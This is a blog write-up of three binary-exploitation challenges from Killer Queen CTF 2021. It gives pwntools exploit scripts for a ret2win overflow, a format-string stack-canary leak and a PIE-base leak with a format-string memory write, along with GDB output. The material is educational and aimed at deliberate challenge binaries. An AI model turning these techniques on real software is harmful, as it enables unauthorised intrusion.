---
title: 'Killer Queen CTF: Binary Exploitation'
date: 2021-10-31T00:00:00+00:00
author: Kris
layout: post
image: /images/2021/killerqueen/title.png
categories:
  - Write-Ups
  - Pwn
---
Fun CTF with some binary exploitation challenges that were at my basic level and had no significant hidden catches to block me solving them. I'll cover *zoom2win*, *Tweety birb* and *Broke College Students* in this writeup.

#### <a name="zoom2win"></a>Zoom2Win - Pwn - 225 points

This challenge reads:

```
what would CTFs be without our favorite ret2win (nc 143.198.184.186 5003)

163 solves
```

With this challenge comes one file:

- `zoom2win`

Quickly triaging the binary its a 64 bit ELF binary and from the clue / description its likely a pretty simple stack overflow expecting us to ROP to some kind of win function.

A quick look in Ghidra confirms this. A very simple `main()` function and a `flag()` function elsewhere that we can return to.

```c
void main(void)
{
  char buf [32];
  
  puts("Let\'s not overcomplicate. Just zoom2win :)");
  gets(buf);
  return;
}

void flag(void)
{
  system("cat flag.txt");
  return;
}
```

In GDB we find the offset where the return address is overwritten is 40 by using Peda's `pattern_create` feature:

```shell
$ gdb ./zoom2win
...
gdb-peda$ pattern_create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r
Starting program: /root/kq/zoom2win/zoom2win 
Let's not overcomplicate. Just zoom2win :)
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA

Program received signal SIGSEGV, Segmentation fault.
...
Stopped reason: SIGSEGV
0x00000000004011dd in main ()
gdb-peda$ bt
#0  0x00000000004011dd in main ()
#1  0x4141464141304141 in ?? ()
...
gdb-peda$ pattern_offset 0x4141464141304141
4702116732032008513 found at offset: 40
```

We can write a basic exploit using a standard pattern and pwntools that I've been writing a lot of lately:

```python
from pwn import *

binary = ELF('zoom2win')

payload = b'A' * 40
payload += p64(binary.sym["flag"])

local = True
if local:
    p = process("./zoom2win")
else:
    p = remote("143.198.184.186", 5003)
p.recvline()
p.sendline(payload)
p.interactive()
p.close()
```

And when I try this locally it works, great!

```shell
$ python exploit.py 
[*] '/root/kq/zoom2win/zoom2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './zoom2win': pid 839936
[*] Switching to interactive mode
local_test_flag
[*] Got EOF while reading in interactive
```

But unfortunately it fails against the live server:

```shell
python fail.py 
[*] '/root/kq/zoom2win/zoom2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 143.198.184.186 on port 5003: Done
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```

On discord the author of the challenge mentioned that this is likely because of stack alignment. This is something I've seen before when attacking services running Ubuntu Linux. In order to align the stack I use another single `ret` gadget before intended return to `flag()` and try again. A quick `ropsearch` in gdb Peda:

```python
gdb-peda$ ropsearch ret
Searching for ROP gadget: 'ret' in: binary ranges
0x0040101a : (b'c3')    ret
    ...
```

The modified exploit:

```python
from pwn import *

binary = ELF('zoom2win')

payload = b'A' * 40
payload += p64(0x0040101a) # ret gadget
payload += p64(binary.sym["flag"])

local = False
if local:
    p = process("./zoom2win")
else:
    p = remote("143.198.184.186", 5003)
p.recvline()
p.sendline(payload)
p.interactive()
p.close()
```

And then this time it worked...

```shell
$ python exploit.py
[*] '/root/kq/zoom2win/zoom2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 143.198.184.186 on port 5003: Done
[*] Switching to interactive mode
kqctf{did_you_zoom_the_basic_buffer_overflow_?}
[*] Got EOF while reading in interactive
```



#### <a name="tweety"></a>Tweety Birb - Pwn - 269 points

This challenge reads:

```
Pretty standard birb protection (nc 143.198.184.186 5002)

105 solves
```

With this challenge comes one file:

- `tweetybirb`

So given the mentions of "birbs" I'm thinking that this is some stack canary defeat exploitation challenge. Let's look at the file:

```shell
$ file tweetybirb
tweetybirb: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=b4d4948472c96835ae212febfaa1866e0cfa3082, for GNU/Linux 3.2.0, not s
tripped
$ checksec tweetybirb
[*] 'tweetybirb'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

So yeah, 64bit ELF with canaries enabled. Let's look at the decompiler:

```c
void main(void)
{
  long in_FS_OFFSET;
  char buf [72];
  long stack_canary;
  
  stack_canary = *(long *)(in_FS_OFFSET + 0x28);
  puts(
      "What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it\'s not like you hacker can do anything. Anyways, what do you think of magpies?"
      );
  gets(buf);
  printf(buf);
  puts("\nhmmm interesting. What about water fowl?");
  gets(buf);
  if (stack_canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

void win(void)
{
  system("cat /home/user/flag.txt");
  return;
}
```

So two vulnerabilities here.

1. Format string vulnerability in `printf(buf);`
2. Stack overflow in `gets(buf);`

Again we also have a function called `win()` in this binary that if we return to, it will give us the flag. My attack plan at the start is:

1. Use the format string vuln to leak the canary.
2. Stack overflow, overwrite the return pointer with a pointer to our `win()` function.
3. Remember last time we had to align the stack so do that with a `ret` gadget as well.

##### Leaking the Canary

So first duty is to find where the canary is located on the stack, we can use positional format strings to leak successive blocks of the stack until we bump into it. We know two things about canaries in Linux:

1. They're 64bits.
2. Always end in 00.

I'm using this format string specifier to look `%x$016llx` where x is some integer. I use this script locally to find candidates:

```python
from pwn import *

for i in range(1,50):
    p = process('./tweetybirb')
    p.recvline()
    p.sendline(b'%%%d$016llx' % i)
    res = p.recvline().decode().strip()
    if res != '0000000000000000' and res.endswith('00'):
        print('Canary maybe here %%%d$016llx: %s' %(i,res))
    p.close()
```

It found this candidate pretty quickly:

```shell
$ PWNLIB_SILENT=1 ./findcanary.py 
Canary maybe here %15$016llx: e494f91ef9963500
```

I checked in GDB and that was the canary being loaded at the time so we knew our canary now!

##### Placing the Canary

Next we need to attack the stack overflow. In order to do our intended ROP chain we need to know two things:

1. At what offset does our canary need to land in our payload to pass the canary check.
2. At what offset does our return pointer get overwritten.

I used GDB w/peda to learn these two things. To learn the canary offset I sent a `pattern_create` cyclic pattern and set a breakpoint when it was about to be checked.

```python
$ gdb ./tweetybirb
...
gdb-peda$ disass main
Dump of assembler code for function main:
   0x00000000004011f2 <+0>:     endbr64 
   0x00000000004011f6 <+4>:     push   rbp
   0x00000000004011f7 <+5>:     mov    rbp,rsp
   0x00000000004011fa <+8>:     sub    rsp,0x50
   0x00000000004011fe <+12>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000401207 <+21>:    mov    QWORD PTR [rbp-0x8],rax
   0x000000000040120b <+25>:    xor    eax,eax
   0x000000000040120d <+27>:    lea    rdi,[rip+0xe0c]        # 0x402020
   0x0000000000401214 <+34>:    call   0x401090 <puts@plt>
   0x0000000000401219 <+39>:    lea    rax,[rbp-0x50]
   0x000000000040121d <+43>:    mov    rdi,rax
   0x0000000000401220 <+46>:    mov    eax,0x0
   0x0000000000401225 <+51>:    call   0x4010d0 <gets@plt>
   0x000000000040122a <+56>:    lea    rax,[rbp-0x50]
   0x000000000040122e <+60>:    mov    rdi,rax
   0x0000000000401231 <+63>:    mov    eax,0x0
   0x0000000000401236 <+68>:    call   0x4010c0 <printf@plt>
   0x000000000040123b <+73>:    lea    rdi,[rip+0xeb6]        # 0x4020f8
   0x0000000000401242 <+80>:    call   0x401090 <puts@plt>
   0x0000000000401247 <+85>:    lea    rax,[rbp-0x50]
   0x000000000040124b <+89>:    mov    rdi,rax
   0x000000000040124e <+92>:    mov    eax,0x0
   0x0000000000401253 <+97>:    call   0x4010d0 <gets@plt>
   0x0000000000401258 <+102>:   mov    eax,0x0
   0x000000000040125d <+107>:   mov    rdx,QWORD PTR [rbp-0x8]
   0x0000000000401261 <+111>:   xor    rdx,QWORD PTR fs:0x28
   0x000000000040126a <+120>:   je     0x401271 <main+127>
   0x000000000040126c <+122>:   call   0x4010a0 <__stack_chk_fail@plt>
   0x0000000000401271 <+127>:   leave  
   0x0000000000401272 <+128>:   ret    
End of assembler dump.
gdb-peda$
```

We know that the stack canary comparison happens at `main+120` after it is loaded into `rdx` and `main+107`. Setting a breakpoint at `main+111` means our pattern string will be in `rdx` at the time and we can learn what offset was loaded. This is how i did that:

```shell
gdb-peda$ br *main+111
Breakpoint 1 at 0x401261
gdb-peda$ pattern_create 80
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A'
gdb-peda$ run
Starting program: tweetybirb 
What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it's not like you hacker can do anything. Anyways, what do you think of magpies?
%15$016llx
ad7a934c1fcb5300
hmmm interesting. What about water fowl?
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A
Breakpoint 1, 0x0000000000401261 in main ()
gdb-peda$ i r $rdx
rdx            0x4134414165414149  0x4134414165414149
gdb-peda$ pattern_offset 0x4134414165414149
4698452060381725001 found at offset: 72
```

Cool! So now we know we need to write our canary at offset 72 in our string. Let's write our exploit so we can learn the return address offset next.

##### Finding the return pointer overwrite offset

```python
from pwn import *

binary = ELF('./tweetybirb')

ret = 0x00401344

# canary fmt string
canary_fmt = b"%15$016llx"
p = process("./tweetybirb")
p.recvline()
p.sendline(canary_fmt)
canary = int(p.recv(16).decode(),16)
log.success('got canary: %s' % hex(canary))

# canary offset: 72
payload = b'A' * 72
payload += p64(canary)
payload += b'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4A'

p.recvline(2)
input('attach debugger...')
p.sendline(payload)
p.interactive()
```

This will place our canary in the correct place allowing us to get to the SIGSEGV and find out our return address on the stack. When i run it, it gets right up to the point before sending the overflow payload and waits for a debugger to be attached:

```shell
$ ./findretaddr.py 
[*] 'tweetybirb'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './tweetybirb': pid 865467
[+] got canary: 0xeede540c50a27700
attach debugger...
```

In another window I open GDB and allow the process to continue:

```shell
$ gdb -p `pidof tweetybirb`
...
gdb-peda$ c
Continuing.
```

I return back to the first window and let the payload send... and I get the crash in GDB as expected:

```shell
Program received signal SIGSEGV, Segmentation fault.
Stopped reason: SIGSEGV
0x0000000000401272 in main ()
gdb-peda$ bt
#0  0x0000000000401272 in main ()
#1  0x6e41412441414241 in ?? ()
...
gdb-peda$ pattern_offset 0x6e41412441414241
7944702841627689537 found at offset: 8
```

Great so now we know we're overwriting the return address 8 bytes after the canary. 

##### Put it all together

We should have all the ingredients for the exploit now. Here's what I had:

```python
from pwn import *

binary = ELF('./tweetybirb')
ret = 0x00401344 # ret instruction gadget

# canary fmt string
canary_fmt = b"%15$016llx"
local = False
if local:
    p = process("./tweetybirb")
else:
    p = remote("143.198.184.186", 5002)
p.recvline()
p.sendline(canary_fmt)
canary = int(p.recv(16).decode(),16)
log.success('got canary: %s' % hex(canary))

# canary offset: 72
payload = b'A' * 72
payload += p64(canary)
# ret addr: 88 (72+canary+8)
payload += b'B' * (88-len(payload))
payload += p64(ret)
payload += p64(binary.sym["win"])
p.recvline(2)
p.sendline(payload)
p.interactive()
```

Which actually worked first go :)

```shell
$ python exp.py
[*] 'tweetybirb'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 143.198.184.186 on port 5002: Done
[+] got canary: 0xb1aeea7232a02c00
[*] Switching to interactive mode
hmmm interesting. What about water fowl?
kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}

```



#### <a name="broke"></a>Broke College Students - Pwn - 309 points

This challenge reads:

```
The lengths that some people go to in order to pay for college 
(nc 143.198.184.186 5001)

72 solves
```

This one comes again with a single file:

- `brokecollegestudents`

This again is an ELF 64bit binary, but this time with every protection enabled:

```shell
$ file brokecollegestudents
brokecollegestudents: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fe875e00832ddcdd136fa7ad9946379f24bcfd3d, 
for GNU/Linux 3.2.0, not stripped
$ checksec brokecollegestudents
[*] 'brokecollegestudents'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

With PIE being enabled we know we're certainly going to need a leak to do anything meaningful. Playing around with the binary I could formulate an idea of what we need to do:

```shell
$ ./brokecollegestudents
Welcome to the College Applications!
What would you like to do?
You have 5000 money.
===========================
1) Scholarship Application Portal
2) Collegeboard Website
3) Quit
===========================
Choice: 1
Welcome to the College Applications!
Would you like to delve into scholarship hunting?
It's only $500 and you have a one in a million chance of winning. What a steal!
===========================
You have 5000 money.
1) Yes ($500)
2) No
===========================
Choose: 1
You encountered some kind of wild application essay reader thing!
What do you want to do?

1) Apply!
2) Run away and follow your dreams of art school!
CHOOSE: 1
YOU GOT IT!
You caught a wild scholarship! These are rare.
What is it's name?
name: AAAA
Maybe now you'll be able to afford a single quarter of university! The scholarship you got was: 

AAAAWhat would you like to do?
You have 4500 money.
===========================
1) Scholarship Application Portal
2) Collegeboard Website
3) Quit
===========================
Choice: 2
Welcome to the Collegeboard website!
You have 4500 money.
1) Send a SINGLE AP Test Score ($1000000)
2) Buy FLAG ($9999999)
BUY ITEM (0 to cancel): 2
Hmm doesn't look like you have enough money for that...What would you like to do?
You have 4500 money.
===========================
1) Scholarship Application Portal
2) Collegeboard Website
3) Quit
===========================
Choice: 3
Maybe we'll just all settle for trade school
```

Looks like maybe we need to find an arbitrary read/write primative and change our `Money` to be enough to buy the flag. Let's take a look in Ghidra...

Firstly there's a lot of things going on in this binary but eventually it leads to this bug in `catch()` where if we catch a scholarship we get to name it. There's a format string bug here. This gives us the basics of a read/write primative.

```c
void catch(void)
{
  long in_FS_OFFSET;
  char fmtStringBug [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("You caught a wild scholarship! These are rare.");
  puts("What is it\'s name?");
  printf("name: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00102349,fmtStringBug);
  puts(
      "Maybe now you\'ll be able to afford a single quarter of university! The scholarship you got was: \n"
      );
  printf(fmtStringBug);
  fflush(stdout);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Since PIE is on, the approach I want to take is:

1. Leak the base address.
2. Calculate where in memory `MONEY` is stored relative to the base address.
3. Format string write a bunch of money there.
4. Buy the flag.

After using a similar technique we used in Tweetybirb, I find a good and stable pointer as the 23rd argument on the stack:

```shell
$ ./brokecollegestudents                                                                                                                                 
Welcome to the College Applications!
What would you like to do?
You have 5000 money.
===========================
1) Scholarship Application Portal
2) Collegeboard Website
3) Quit
===========================
Choice: 1
Welcome to the College Applications!
Would you like to delve into scholarship hunting?
It's only $500 and you have a one in a million chance of winning. What a steal!
===========================
You have 5000 money.
1) Yes ($500)
2) No
===========================
Choose: 1
You encountered some kind of wild application essay reader thing!
What do you want to do?

1) Apply!
2) Run away and follow your dreams of art school!
CHOOSE: 1
YOU GOT IT!
You caught a wild scholarship! These are rare.
What is it's name?
name: %23$016llx
Maybe now you'll be able to afford a single quarter of university! The scholarship you got was: 

0000556adb57992d
```

After I get that address I can find out the base address of the binary and check the offset:

```shell
$ cat /proc/$(pidof brokecollegestudents)/maps
556adb578000-556adb579000 r--p 00000000 08:01 1051727                    brokecollegestudents
...

```

So we know the base address is `0x556adb578000` and the leaked pointer is `0x556adb57992d`. Quick math: `0x556adb57992d - 0x556adb578000
6445` . I ran the binary multiple times and this `%23$016llx` pointer always ended up being 6445 bytes away from the binary base address. So now we know how to locate our PIE base address.

Next we want to know where in memory is money stored? To do this I attached a debugger to the process and looked at the `display_money()`function.

```shell
$ gdb -p $(pidof brokecollegestudents)
gdb-peda$ disass display_money
Dump of assembler code for function display_money:
   0x0000556adb579393 <+0>:     endbr64 
   0x0000556adb579397 <+4>:     push   rbp
   0x0000556adb579398 <+5>:     mov    rbp,rsp
   0x0000556adb57939b <+8>:     mov    eax,DWORD PTR [rip+0x2c7b]        # 0x556adb57c01c <MONEY>
   0x0000556adb5793a1 <+14>:    mov    esi,eax
   0x0000556adb5793a3 <+16>:    lea    rdi,[rip+0xca7]        # 0x556adb57a051
   0x0000556adb5793aa <+23>:    mov    eax,0x0
   0x0000556adb5793af <+28>:    call   0x556adb579110 <printf@plt>
```

There it is, `MONEY` is at `0x556adb57c01c`.  That is `0x556adb57c01c - 0x556adb578000 = 16412` away from the base address. I checked a few times and its always there so we have a reliable way to locate our money.

Next we need to overwrite money. Pwntool's helps here, this is the first exploit I tried:

```python
from pwn import *

host, port = "143.198.184.186", 5001

local = True

binary = context.binary = ELF('./brokecollegestudents')

if local:
    p = process('./brokecollegestudents')
else:
    p = remote(host,port)

ptrbaseoffset = 6445 # base is 6445 less than the leaked pointer
moneyoffset = 16412  # money offset is baseaddr+16412

# leak a pointer and calculate base address and money address
p.recvuntil(b'Choice: ')
p.sendline(b'1')
p.recvlines(8)
p.sendline(b'1')
p.recvuntil(b'CHOOSE: ')
p.sendline(b'1')
p.recvuntil(b'name: ')
p.sendline(b'%23$016llx')
p.recvlines(2)
leak = p.recvline().decode()[0:16]

# Calculate base and money addresses.
base = int(leak,16)-6445
money = base+moneyoffset

log.info('leaked base address: %x' % base)
log.info('money location: %x' % money)

# write a bunch of money
# our fmt string is 6th on the stack
write = {money:10000000}
payload = fmtstr_payload(6,write)

p.recvuntil(b'Choice: ')
p.sendline(b'1')
p.recvlines(8)
p.sendline(b'1')
p.recvuntil(b'CHOOSE: ')
p.sendline(b'1')
p.recvuntil(b'name: ')
p.sendline(payload)
p.recvlines(3)
balance = p.recvline().decode().split()[2]
log.success("Money balance now: %s" % balance)
log.info("Now go on a shopping spree!!")
p.interactive()
```

Unfortunately there is no way this can work. Writing such a large value causes the stack canary to bust us:

```shell
$ python exp.py
[*] 'brokecollegestudents'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process './brokecollegestudents': pid 877737
[*] leaked base address: 55a3e93b4000
[*] money location: 55a3e93b801c
Traceback (most recent call last):
  File "exp.py", line 52, in <module>
    balance = p.recvline().decode().split()[2]
  File "/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/tube.py", line 490, in recvline
    return self.recvuntil(self.newline, drop = not keepends, timeout = timeout)
  File "/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/tube.py", line 333, in recvuntil
    res = self.recv(timeout=self.timeout)
  File "/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/tube.py", line 105, in recv
    return self._recv(numb, timeout) or b''
  File "/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/tube.py", line 183, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
  File "/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/tube.py", line 154, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
  File "/usr/local/lib/python3.9/dist-packages/pwnlib/tubes/process.py", line 727, in recv_raw
    raise EOFError
EOFError
[*] Process './brokecollegestudents' stopped with exit code -6 (SIGABRT) (pid 877737)
```

SIGABRT means we tripped the stack canary protection.

Then I had the idea, instead of writing the entire $10,000,000 we need to buy the flag, lets just write 1 byte into a significant enough position to increase our money. The next exploit looked like this:

```python
from pwn import *

host, port = "143.198.184.186", 5001

local = False

binary = context.binary = ELF('./brokecollegestudents')

if local:
    p = process('./brokecollegestudents')
else:
    p = remote(host,port)

ptrbaseoffset = 6445 # base is 6445 less than the leaked pointer
moneyoffset = 16412  # money offset is baseaddr+16412

# leak a pointer and calculate base address and money address
p.recvuntil(b'Choice: ')
p.sendline(b'1')
p.recvlines(8)
p.sendline(b'1')
p.recvuntil(b'CHOOSE: ')
p.sendline(b'1')
p.recvuntil(b'name: ')
p.sendline(b'%23$016llx')
p.recvlines(2)
leak = p.recvline().decode()[0:16]

base = int(leak,16)-6445
money = base+moneyoffset

log.info('leaked base address: %x' % base)
log.info('money location: %x' % money)

# write a bunch of money
# our fmt string is 6th on the stack
write = {money+3:0x10}
payload = fmtstr_payload(6,write)

p.recvuntil(b'Choice: ')
p.sendline(b'1')
p.recvlines(8)
p.sendline(b'1')
p.recvuntil(b'CHOOSE: ')
p.sendline(b'1')
p.recvuntil(b'name: ')
p.sendline(payload)
p.recvlines(3)
balance = p.recvline().decode().split()[2]
log.success("Money balance now: %s" % balance)
log.info("Now go on a shopping spree!!")
p.interactive()
```

And this time it was muich smoother:

```shell
$ python exp.py
[*] 'brokecollegestudents'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 143.198.184.186 on port 5001: Done
[*] leaked base address: 559a913a3000
[*] money location: 559a913a701c
[+] Money balance now: 268439456
[*] Now go on a shopping spree!!
[*] Switching to interactive mode
===========================
1) Scholarship Application Portal
2) Collegeboard Website
3) Quit
===========================
Choice: $ 2
Welcome to the Collegeboard website!
You have 268439456 money.
1) Send a SINGLE AP Test Score ($1000000)
2) Buy FLAG ($9999999)
$ 2
BUY ITEM (0 to cancel): kqctf{did_you_resort_to_selling_NFTs_for_college_money_????}
```

That was fun! Three pwns is more than I normally get in a CTF and each was more fun than the last.
